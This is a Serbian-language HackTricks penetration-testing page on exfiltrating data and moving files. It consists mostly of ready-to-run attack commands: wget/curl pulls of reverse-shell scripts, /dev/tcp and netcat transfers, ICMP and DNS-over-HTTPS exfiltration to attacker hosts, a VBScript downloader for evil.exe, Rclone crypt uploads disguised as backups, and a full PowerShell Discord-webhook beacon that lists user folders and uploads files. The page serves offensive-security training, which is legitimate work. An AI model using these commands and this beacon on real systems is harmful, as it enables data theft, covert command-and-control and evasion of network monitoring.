# Eksfiltracija

{{#include ../banners/hacktricks-training.md}}

> [!TIP]
> Za primer celokupnog postupka pripreme loot-a u `C:\Users\Public` i njegove eksfiltracije pomoću Rclone-a, kako bi se oponašale legitimne rezervne kopije, pogledajte sledeći postupak.

{{#ref}}
../windows-hardening/windows-local-privilege-escalation/dll-hijacking/advanced-html-staged-dll-sideloading.md
{{#endref}}

## Domeni koji su često na beloj listi i pogodni za eksfiltraciju informacija

Posetite [https://lots-project.com/](https://lots-project.com/) da biste pronašli domene koji su često na beloj listi i koji se mogu zloupotrebiti

## Kopiranje i lepljenje Base64

**Linux**

```bash
base64 -w0 <file> #Encode file
base64 -d file #Decode file
```

**Windows**

```
certutil -encode payload.dll payload.b64
certutil -decode payload.b64 payload.dll
```

## HTTP

**Linux**

```bash
wget 10.10.14.14:8000/tcp_pty_backconnect.py -O /dev/shm/.rev.py
wget 10.10.14.14:8000/tcp_pty_backconnect.py -P /dev/shm
curl 10.10.14.14:8000/shell.py -o /dev/shm/shell.py
fetch 10.10.14.14:8000/shell.py #FreeBSD
```

**Windows**

```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64
bitsadmin /transfer transfName /priority high http://example.com/examplefile.pdf C:\downloads\examplefile.pdf

#PS
(New-Object Net.WebClient).DownloadFile("http://10.10.14.2:80/taskkill.exe","C:\Windows\Temp\taskkill.exe")
Invoke-WebRequest "http://10.10.14.2:80/taskkill.exe" -OutFile "taskkill.exe"
wget "http://10.10.14.2/nc.bat.exe" -OutFile "C:\ProgramData\unifivideo\taskkill.exe"

Import-Module BitsTransfer
Start-BitsTransfer -Source $url -Destination $output
#OR
Start-BitsTransfer -Source $url -Destination $output -Asynchronous
```

### Otpremanje datoteka

- [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
- [**SimpleHttpServer koji ispisuje GET i POST zahteve (kao i zaglavlja)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
- Python modul [uploadserver](https://pypi.org/project/uploadserver/):

```bash
# Listen to files
python3 -m pip install --user uploadserver
python3 -m uploadserver
# With basic auth:
# python3 -m uploadserver --basic-auth hello:world

# Send a file
curl -X POST http://HOST/upload -H -F 'files=@file.txt'
# With basic auth:
# curl -X POST http://HOST/upload -H -F 'files=@file.txt' -u hello:world
```

### **HTTPS server**

```python
# from https://gist.github.com/dergachev/7028596
# taken from http://www.piware.de/2011/01/creating-an-https-server-in-python/
# generate server.xml with the following command:
#    openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
# run as follows:
#    python simple-https-server.py
# then in your browser, visit:
#    https://localhost:443

### PYTHON 2
import BaseHTTPServer, SimpleHTTPServer
import ssl

httpd = BaseHTTPServer.HTTPServer(('0.0.0.0', 443), SimpleHTTPServer.SimpleHTTPRequestHandler)
httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)
httpd.serve_forever()
###

### PYTHON3
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl

httpd = HTTPServer(('0.0.0.0', 443), BaseHTTPRequestHandler)
httpd.socket = ssl.wrap_socket(httpd.socket, certfile="./server.pem", server_side=True)
httpd.serve_forever()
###

### USING FLASK
from flask import Flask, redirect, request
from urllib.parse import quote
app = Flask(__name__)
@app.route('/')
def root():
    print(request.get_json())
    return "OK"
if __name__ == "__main__":
    app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
###
```

### HTTP/3 / QUIC

Ako su izlazne kontrole podešene za inspekciju klasičnog **TCP/443**, ali su popustljive prema **UDP/443**, forsiranje protokola **HTTP/3** može prebaciti prenos na **QUIC** umesto na TLS-over-TCP. Krajnja tačka napadača mora da podržava HTTP/3 izvorno (na primer, reverse proxy ili endpoint za otpremanje koji već oglašava `Alt-Svc: h3`).

```bash
# Strict: fail if QUIC/H3 is not available
curl --http3-only -T loot.7z https://attacker-h3.example/upload

# Opportunistic: prefer H3, but fall back to h2/h1 if QUIC fails
curl --http3 -T loot.7z https://attacker-h3.example/upload

# Learn the server's Alt-Svc advertisement and reuse it
curl --alt-svc /tmp/altsvc.cache https://attacker-h3.example/
curl --alt-svc /tmp/altsvc.cache -T loot.7z https://attacker-h3.example/upload
```

Istraživački rad iz 2025. godine (QUIC-Exfil) otkrio je da QUIC-ova šifrovana zaglavlja i dinamičke promene adresa mogu da otežaju detekciju eksfiltracije na nivou firewall-a više nego kanali zasnovani na TLS-u ili DNS-u. U radu je demonstriran metod sa adresom koju preferira server, a koji prikriva eksfiltraciju kao migraciju veze na strani servera.<sup>[[9]](#references)</sup>

### Otpremanje u skladište objekata pomoću unapred potpisanih URL-ova / delegiranih dozvola

Kada možete da napravite ili pribavite kratkotrajni **signed URL**, žrtvi je potreban samo uobičajeni HTTPS klijent. Time se izbegava instaliranje cloud SDK-ova ili korišćenje dugotrajnih akreditiva na hostu.<sup>[[8]](#references)</sup> To se takođe može uklopiti u uobičajeni saobraćaj ka skladištima objekata.

**Linux / macOS (AWS S3 pre-signed `PUT`)**

```bash
curl -X PUT -T loot.7z \
  -H 'Content-Type: application/octet-stream' \
  'https://bucket.s3.amazonaws.com/case123/loot.7z?<presigned-query>'
```

**Windows PowerShell (AWS S3 `PUT` sa unapred potpisanim URL-om)**

```powershell
Invoke-WebRequest -Method Put -InFile .\loot.7z `
  -ContentType 'application/octet-stream' `
  -Uri $presignedUrl
```

**Azure Blob SAS URL**

```bash
curl -X PUT --data-binary @loot.7z \
  -H 'x-ms-blob-type: BlockBlob' \
  -H 'Content-Type: application/octet-stream' \
  'https://acct.blob.core.windows.net/container/loot.7z?<sas>'
```

Beleške:
- Pre-signed URLs / SAS tokens obično ograničavaju **putanju**, **HTTP metod** i **rok važenja**.<sup>[[8]](#references)[[10]](#references)</sup>
- Za Azure Blob `Put Blob` obavezno je zaglavlje `x-ms-blob-type: BlockBlob`.<sup>[[10]](#references)</sup>
- Ovaj obrazac dobro funkcioniše uz `curl`, `Invoke-WebRequest` ili bilo koji prilagođeni implant koji može da pošalje sirovi HTTPS `PUT`.

### goshs

[goshs](https://github.com/patrickhener/goshs) je zamena u obliku jedne izvršne datoteke za `python3 -m http.server`.<sup>[[4]](#references)</sup>
Podržava upload, download, WebDAV, SFTP, SMB, TLS, autentifikaciju, linkove za deljenje i OOB funkcije za saradnju (DNS, SMTP, hvatanje NTLM hash-eva).<sup>[[4]](#references)</sup>

```bash
# Serve current directory on port 8000
goshs

# Serve with HTTPS (self-signed)
goshs -s -ss

# Serve with basic auth
goshs -b user:password

# Upload-only mode
goshs -uo

# Read-only mode
goshs -ro

# Capture SMB NTLM hashes
goshs -smb -smb-domain CORP

# DNS callback server
goshs -dns -dns-ip 10.10.10.10

# SMTP callback server
goshs -smtp -smtp-domain [REDACTED]

# Tunnel via localhost.run (no port forwarding needed)
goshs -tunnel
```

## Webhooks (Discord/Slack/Teams) za C2 i eksfiltraciju podataka

Webhooks su HTTPS endpointi koji omogućavaju samo upis i prihvataju JSON i opcionalne delove sa datotekama. Obično su dozvoljeni za pouzdane SaaS domene i ne zahtevaju OAuth/API ključeve, što ih čini korisnim za beaconing i eksfiltraciju uz malo prepreka.<sup>[[5]](#references)[[6]](#references)</sup>

Ključne ideje:
- Endpoint: Discord koristi https://discord.com/api/webhooks/<id>/<token>
- POST multipart/form-data sa delom pod nazivom payload_json koji sadrži {"content":"..."} i opcionalnim delom/delovima za datoteke pod nazivom file.
- Obrazac petlje operatora: periodični beacon -> izviđanje direktorijuma -> ciljana eksfiltracija datoteka -> ispis izviđanja -> čekanje. HTTP 204 NoContent/200 OK potvrđuju isporuku.

PowerShell PoC (Discord):

```powershell
# 1) Configure webhook and optional target file
$webhook = "https://discord.com/api/webhooks/YOUR_WEBHOOK_HERE"
$target  = Join-Path $env:USERPROFILE "Documents\SENSITIVE_FILE.bin"

# 2) Reuse a single HttpClient
$client = [System.Net.Http.HttpClient]::new()

function Send-DiscordText {
    param([string]$Text)
    $payload = @{ content = $Text } | ConvertTo-Json -Compress
    $jsonContent = New-Object System.Net.Http.StringContent($payload, [System.Text.Encoding]::UTF8, "application/json")
    $mp = New-Object System.Net.Http.MultipartFormDataContent
    $mp.Add($jsonContent, "payload_json")
    $resp = $client.PostAsync($webhook, $mp).Result
    Write-Host "[Discord] text -> $($resp.StatusCode)"
}

function Send-DiscordFile {
    param([string]$Path, [string]$Name)
    if (-not (Test-Path $Path)) { return }
    $bytes = [System.IO.File]::ReadAllBytes($Path)
    $fileContent = New-Object System.Net.Http.ByteArrayContent(,$bytes)
    $fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/octet-stream")
    $json = @{ content = ":package: file exfil: $Name" } | ConvertTo-Json -Compress
    $jsonContent = New-Object System.Net.Http.StringContent($json, [System.Text.Encoding]::UTF8, "application/json")
    $mp = New-Object System.Net.Http.MultipartFormDataContent
    $mp.Add($jsonContent, "payload_json")
    $mp.Add($fileContent, "file", $Name)
    $resp = $client.PostAsync($webhook, $mp).Result
    Write-Host "[Discord] file $Name -> $($resp.StatusCode)"
}

# 3) Beacon/recon/exfil loop
$ctr = 0
while ($true) {
    $ctr++
    # Beacon
    $beacon = "━━━━━━━━━━━━━━━━━━`n:satellite: Beacon`n```User: $env:USERNAME`nHost: $env:COMPUTERNAME```"
    Send-DiscordText -Text $beacon

    # Every 2nd: quick folder listing
    if ($ctr % 2 -eq 0) {
        $dirs = @("Documents","Desktop","Downloads","Pictures")
        $acc = foreach ($d in $dirs) {
            $p = Join-Path $env:USERPROFILE $d
            $items = Get-ChildItem -Path $p -ErrorAction SilentlyContinue | Select-Object -First 3 -ExpandProperty Name
            if ($items) { "`n$d:`n - " + ($items -join "`n - ") }
        }
        Send-DiscordText -Text (":file_folder: **User Dirs**`n━━━━━━━━━━━━━━━━━━`n```" + ($acc -join "") + "```")
    }

    # Every 3rd: targeted exfil
    if ($ctr % 3 -eq 0) { Send-DiscordFile -Path $target -Name ([IO.Path]::GetFileName($target)) }

    # Every 4th: basic recon
    if ($ctr % 4 -eq 0) {
        $who = whoami
        $ip  = ipconfig | Out-String
        $tmp = Join-Path $env:TEMP "recon.txt"
        "whoami:: $who`r`nIPConfig::`r`n$ip" | Out-File -FilePath $tmp -Encoding utf8
        Send-DiscordFile -Path $tmp -Name "recon.txt"
    }

    Start-Sleep -Seconds 20
}
```

Napomene:
- Slični obrasci važe i za druge platforme za saradnju (Slack/Teams) koje koriste incoming webhook-ove; prilagodite URL i JSON šemu.
- Za DFIR analizu artefakata iz Discord Desktop keša i oporavak webhook/API podataka pogledajte povezanu stranicu ispod.<sup>[[7]](#references)</sup>

{{#ref}}
../generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/discord-cache-forensics.md
{{#endref}}

## Rclone (cloud/object-storage exfiltration)

Savremeni operateri često **prvo smeste loot lokalno**, a zatim koriste [Rclone](https://rclone.org/) da bi transfer izgledao kao uobičajen posao pravljenja rezervne kopije ili sinhronizacije. Praktičan obrazac je:

1. Uobičajeni remote (`s3`, `webdav`, `drive`, `mega`, ...)
2. `crypt` wrapper za **šifrovanje sadržaja i naziva datoteka na klijentskoj strani**
3. Opcionalni `chunker` wrapper ako provajder nameće ograničenja veličine objekata ili želite manje jedinice za otpremanje

```bash
# 1) Create the storage backend remote (interactive)
rclone config              # ex: remote

# 2) Wrap it with client-side encryption
rclone config              # ex: secret -> remote:path

# 3) Optional: create a chunker overlay for large objects
rclone config              # ex: overlay -> secret:

# 4) Upload staged data
rclone copy /loot secret:$(hostname)-$(date +%F) \
  --transfers 2 --checkers 2 --bwlimit 4M
# If you created the chunker wrapper, upload to overlay:... instead
```

Napomene:
- `crypt` može da šifruje i sadržaj datoteka i njihova imena.<sup>[[3]](#references)</sup>
- `chunker` transparentno deli velike datoteke i ponovo ih sastavlja prilikom preuzimanja.<sup>[[11]](#references)</sup>
- `rclone.conf` čuva tajne za `crypt` u **prikrivenom** obliku, koji ne pruža snažnu zaštitu podataka u mirovanju.<sup>[[3]](#references)</sup> Za kratkotrajne operacije, prednost dajte posebnoj privremenoj konfiguraciji i uklonite je nakon upotrebe. Ako morate da je zadržite duže, prednost dajte šifrovanom upravljanju konfiguracijom (`RCLONE_CONFIG_PASS` / `--password-command`) umesto da ostavite običan `rclone.conf` na disku.<sup>[[11]](#references)</sup>
- Ako cilj već sinhronizuje **OneDrive**, **Google Drive** ili **Dropbox**, kopiranje plena u sinhronizovani direktorijum može da iskoristi već odobrenog klijenta umesto da ubacuje novi program za prenos.

{{#ref}}
../generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/local-cloud-storage.md
{{#endref}}

## FTP

### FTP server (python)

```bash
pip3 install pyftpdlib
python3 -m pyftpdlib -p 21
```

### FTP server (NodeJS)

```
sudo npm install -g ftp-srv --save
ftp-srv ftp://0.0.0.0:9876 --root /tmp
```

### FTP server (pure-ftp)

```bash
apt-get update && apt-get install pure-ftp
```

```bash
#Run the following script to configure the FTP server
#!/bin/bash
groupadd ftpgroup
useradd -g ftpgroup -d /dev/null -s /etc ftpuser
pure-pwd useradd fusr -u ftpuser -d /ftphome
pure-pw mkdb
cd /etc/pure-ftpd/auth/
ln -s ../conf/PureDB 60pdb
mkdir -p /ftphome
chown -R ftpuser:ftpgroup /ftphome/
/etc/init.d/pure-ftpd restart
```

### **Windows** klijent

```bash
#Work well with python. With pure-ftp use fusr:ftp
echo open 10.11.0.41 21 > ftp.txt
echo USER anonymous >> ftp.txt
echo anonymous >> ftp.txt
echo bin >> ftp.txt
echo GET mimikatz.exe >> ftp.txt
echo bye >> ftp.txt
ftp -n -v -s:ftp.txt
```

## SMB

Kali kao server

```bash
kali_op1> impacket-smbserver -smb2support kali `pwd` # Share current directory
kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
#For new Win10 versions
impacket-smbserver -smb2support -user test -password test test `pwd`
```

Ili napravite SMB deljeni resurs **pomoću Sambe**:

```bash
apt-get install samba
mkdir /tmp/smb
chmod 777 /tmp/smb
#Add to the end of /etc/samba/smb.conf this:
[public]
    comment = Samba on Ubuntu
    path = /tmp/smb
    read only = no
    browsable = yes
    guest ok = Yes
#Start samba
service smbd restart
```

Windows

```bash
CMD-Wind> \\10.10.14.14\path\to\exe
CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials

WindPS-1> New-PSDrive -Name "new_disk" -PSProvider "FileSystem" -Root "\\10.10.14.9\kali"
WindPS-2> cd new_disk:
```

### goshs
[goshs](https://github.com/patrickhener/goshs) je alternativa koja se sastoji od jedne binarne datoteke, služi datoteke preko SMB-a i hvata NTLM hash vrednosti klijenata koji se povezuju.<sup>[[4]](#references)</sup>

```bash
# Start SMB server with NTLM hash capture
goshs -smb -smb-domain CORP

# Also works for plain HTTP file serving
goshs
```

## SCP

Napadač mora da ima pokrenut SSHd.

```bash
scp <username>@<Attacker_IP>:<directory>/<filename>
```

## SSHFS

Ako žrtva ima SSH, napadač može da montira direktorijum sa žrtvine mašine na svoju.

```bash
sudo apt-get install sshfs
sudo mkdir /mnt/sshfs
sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP address>:<Full path to folder>/ /mnt/sshfs/
```

## NC

```bash
nc -lvnp 4444 > new_file
nc -vn <IP> 4444 < exfil_file
```

## /dev/tcp

### Preuzimanje datoteke sa žrtve

```bash
nc -lvnp 80 > file #Inside attacker
cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
```

### Otpremanje datoteke žrtvi

```bash
nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
# Inside victim
exec 6< /dev/tcp/10.10.10.10/4444
cat <&6 > file.txt
```

zahvaljujući **@BinaryShadow\_**

## **ICMP**

```bash
# To exfiltrate the content of a file via pings you can do:
xxd -p -c 4 /path/file/exfil | while read line; do ping -c 1 -p $line <IP attacker>; done
#This will 4bytes per ping packet (you could probably increase this until 16)
```

```python
from scapy.all import *
#This is ippsec receiver created in the HTB machine Mischief
def process_packet(pkt):
    if pkt.haslayer(ICMP):
        if pkt[ICMP].type == 0:
            data = pkt[ICMP].load[-4:] #Read the 4bytes interesting
            print(f"{data.decode('utf-8')}", flush=True, end="")

sniff(iface="tun0", prn=process_packet)
```

## DNS over HTTPS (DoH)

Ako je klasični UDP/53 DNS upadljiv ili blokiran, ali je odlazni HTTPS uglavnom dozvoljen, uobičajeni obrazac eksfiltracije putem DNS oznaka može se upakovati u **DoH** zahteve ka javnom resolveru. Svaku oznaku držite znatno ispod DNS ograničenja od 63 bajta i koristite alfabet bezbedan za DNS, kao što je Base32.

```bash
# Encode -> split into DNS-safe labels -> send via DoH
base32 -w0 /tmp/loot.bin | tr -d '=' | tr 'A-Z' 'a-z' | fold -w32 | \
  nl -nrz -w4 -s. | while read chunk; do
    curl --http2 -s \
      -H 'accept: application/dns-json' \
      "https://dns.google/resolve?name=${chunk}.exf.attacker.tld&type=TXT" \
      >/dev/null
  done
```

Na autoritativnom DNS serveru za `exf.attacker.tld`, sortirajte upite prema numeričkom prefiksu i rekonstrušite Base32 tok. Tako se transport odvija preko HTTPS-a do resolvera, umesto preko klasičnog UDP/53 DNS-a.<sup>[[2]](#references)</sup>

Za alate za potpune dvosmerne DNS tunele (`iodine`, `dnscat2` itd.) pogledajte [stranicu o tunelovanju](tunneling-and-port-forwarding.md).

## **SMTP**

Ako možete da šaljete podatke SMTP serveru, možete da napravite SMTP server za njihov prijem pomoću pythona:

```bash
sudo python -m smtpd -n -c DebuggingServer :25
```

### goshs

[goshs](https://github.com/patrickhener/goshs) može brzo da pokrene SMTP server za hvatanje email callback-ova tokom OOB scenarija eksfiltracije.<sup>[[4]](#references)</sup>

```bash
# Start SMTP callback server
goshs -smtp -smtp-domain [REDACTED]
```

Primljene email poruke i callback-ovi prikazuju se direktno u izlazu terminala.
Može se kombinovati sa DNS callback serverom za potpunu OOB pokrivenost:

```bash
# DNS + SMTP combined
goshs -dns -dns-ip 10.10.10.10 -smtp -smtp-domain [REDACTED]
```

## TFTP

Podrazumevano je dostupno u XP-u i 2003 (u drugim verzijama mora se izričito dodati tokom instalacije)

U Kali-ju, **pokrenite TFTP server**:

```bash
#I didn't get this options working and I prefer the python option
mkdir /tftp
atftpd --daemon --port 69 /tftp
cp /path/tp/nc.exe /tftp
```

**TFTP server u Python-u:**

```bash
pip install ptftpd
ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
```

Na **victim** se povežite sa Kali serverom:

```bash
tftp -i <KALI-IP> get nc.exe
```

## PHP

Preuzmite datoteku pomoću jednolinijske PHP komande:

```bash
echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
```

## VBScript

```bash
Attacker> python -m SimpleHTTPServer 80
```

**Žrtva**

```bash
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http =CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET", strURL, False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
```

```bash
cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
```

## Debug.exe

Program `debug.exe` ne omogućava samo pregled binarnih datoteka već ima i **mogućnost da ih ponovo izgradi iz heksadecimalnog zapisa**. To znači da `debug.exe` može da generiše binarnu datoteku ako mu se dostavi njen heksadecimalni zapis. Međutim, važno je napomenuti da debug.exe ima **ograničenje: može da sastavlja datoteke veličine do 64 kb**.<sup>[[1]](#references)</sup>

```bash
# Reduce the size
upx -9 nc.exe
wine exe2bat.exe nc.exe nc.txt
```

Zatim kopirajte i nalepite tekst u windows-shell i kreiraće se datoteka pod nazivom nc.exe.

## References

- [1] [Prenos datoteka u Windows](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
- [2] [Javni Google DNS - DNS-over-HTTPS (DoH)](https://developers.google.com/speed/public-dns/docs/doh)
- [3] [Rclone `crypt` backend](https://rclone.org/crypt/)
- [4] [goshs](https://github.com/patrickhener/goshs)
- [5] [Discord kao C2 i keširani dokazi koji ostaju](https://www.pentestpartners.com/security-blog/discord-as-a-c2-and-the-cached-evidence-left-behind/)
- [6] [Discord Webhooks – Izvršavanje Webhook-a](https://discord.com/developers/docs/resources/webhook#execute-webhook)
- [7] [Discord forenzički paket (parser keša)](https://github.com/jwdfir/discord_cache_parser)
- [8] [Otpremanje objekata pomoću unapred potpisanih URL-ova - Amazon S3](https://docs.aws.amazon.com/AmazonS3/latest/userguide/PresignedUrlUploadObject.html)
- [9] [QUIC-Exfil: Iskorišćavanje funkcije Server Preferred Address protokola QUIC za izvođenje napada eksfiltracije podataka](https://arxiv.org/abs/2505.05292)
- [10] [Put Blob (REST API) - Azure Storage](https://learn.microsoft.com/en-us/rest/api/storageservices/put-blob)
- [11] [Rclone dokumentacija](https://rclone.org/docs/#configuration-encryption)
{{#include ../banners/hacktricks-training.md}}
